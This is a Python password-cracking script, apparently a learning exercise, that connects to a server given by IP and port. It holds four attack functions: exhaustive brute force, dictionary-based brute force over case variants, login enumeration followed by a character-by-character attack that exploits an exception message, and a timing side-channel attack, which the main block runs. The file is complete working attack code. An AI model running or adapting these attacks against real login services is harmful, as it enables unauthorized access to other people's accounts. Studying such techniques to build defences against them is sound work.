import time
import sys
import socket
import itertools
import string
import json


def crack_with_dictionary_based_brute_force(_ip_address, _port):
    with socket.socket() as client_socket:
        address = (_ip_address, int(_port))
        client_socket.connect(address)
        with open('C:\Games\passwords.txt', 'r') as f:
            lines = f.readlines()
            success = False
            for line in lines:
                if success:
                    break
                new_line = line
                new_line += (6 - len(line.strip())) * ' '
                a = new_line[0] + new_line[0].upper()
                b = new_line[1] + new_line[1].upper()
                c = new_line[2] + new_line[2].upper()
                d = new_line[3] + new_line[3].upper()
                e = new_line[4] + new_line[4].upper()
                f = new_line[5] + new_line[5].upper()
                iterator = itertools.product(a, b, c, d, e, f, repeat=1)
                for i in iterator:
                    password = ''. join(x for x in i)
                    if password == '':
                        continue
                    client_socket.send(password.encode())
                    response = client_socket.recv(1024)
                    if response.decode() == 'Connection success!':
                        print(password)
                        success = True
                        break


def crack_with_brute_force(_ip_address, _port):
    with socket.socket() as client_socket:
        address = (_ip_address, int(_port))
        client_socket.connect(address)

        digits = string.digits
        letters = string.ascii_lowercase
        symbol_list = list(digits) + list(letters)

        success = False
        for c in range(16):
            iterator = itertools.product(symbol_list, repeat=c)
            for i in iterator:
                password = ''.join(x for x in i)
                if password == '':
                    continue
                client_socket.send(password.encode())
                response = client_socket.recv(1024)
                if response.decode() == 'Connection success!':
                    success = True
                    print(password)
                    break
            if success:
                break


def catching_exception(_ip_address, _port):
    with socket.socket() as client_socket:
        address = (_ip_address, int(_port))
        client_socket.connect(address)

        message = {'login': None, 'password': ''}

        with open('C:\Games\logins.txt', 'r') as f:
            lines = f.readlines()
            for line in lines:
                message['login'] = line.strip()
                client_socket.send(json.dumps(message).encode())
                response = client_socket.recv(1024)
                if json.loads(response)['result'] == 'Wrong password!':
                    message['login'] = line.strip()
                    break

        digits = string.digits
        letters = string.ascii_letters
        symbol_list = list(digits) + list(letters)
        current_password = ''
        success = False
        while not success:
            for symbol in symbol_list:
                message['password'] = current_password + symbol
                client_socket.send(json.dumps(message).encode())
                response = client_socket.recv(1024)
                deserialized_response = json.loads(response)
                if deserialized_response['result'] == 'Exception happened during login':
                    current_password = current_password + symbol
                    continue
                if deserialized_response['result'] == "Connection success!":
                    success = True
                    print(json.dumps(message))
                    break


def time_based_vulnerability(_ip_address, _port):
    with socket.socket() as client_socket:
        address = (_ip_address, int(_port))
        client_socket.connect(address)

        message = {'login': None, 'password': ''}

        with open('/home/aronaks/PycharmProjects/logins.txt', 'r') as f:
            lines = f.readlines()
            for line in lines:
                message['login'] = line.strip()
                client_socket.send(json.dumps(message).encode())
                response = client_socket.recv(1024)
                if json.loads(response)['result'] == 'Wrong password!':
                    message['login'] = line.strip()
                    break

        digits = string.digits
        letters = string.ascii_letters
        symbol_list = list(digits) + list(letters)
        current_password = ''
        success = False
        while not success:
            for symbol in symbol_list:
                start = time.time()
                message['password'] = current_password + symbol
                client_socket.send(json.dumps(message).encode())
                response = client_socket.recv(1024)
                end = time.time()
                deserialized_response = json.loads(response)
                if deserialized_response['result'] == "Connection success!":
                    success = True
                    print(json.dumps(message))
                    break
                if end - start > 0.1:
                    current_password = current_password + symbol
                    continue


if __name__ == '__main__':
    script, ip_address, port = sys.argv
    # crack_with_brute_force(ip_address, port)
    # crack_with_dictionary_based_brute_force(ip_address, port)
    # catching_exception(ip_address, port)
    time_based_vulnerability(ip_address, port)
